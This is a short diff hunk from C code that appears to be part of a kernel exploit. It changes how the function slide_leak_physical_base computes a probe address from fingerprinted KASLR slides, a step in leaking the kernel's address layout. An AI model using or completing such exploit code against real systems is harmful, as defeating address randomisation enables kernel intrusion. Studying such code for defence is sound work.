@@ -1116,7 +1116,7 @@ static int slide_leak_physical_base(void) {
        idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
        idx++) {
     uintptr_t slide = p0_fingerprints[idx].slide;
-    uintptr_t probe_base = 0xffffff8080000000ULL + P0_ORACLE_PROBE_OFFSET - slide;
+    uintptr_t probe_base = 0xffffff8080000000ULL + P0_ORACLE_PROBE_OFFSET + slide;
 
     int match = 1;
     for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
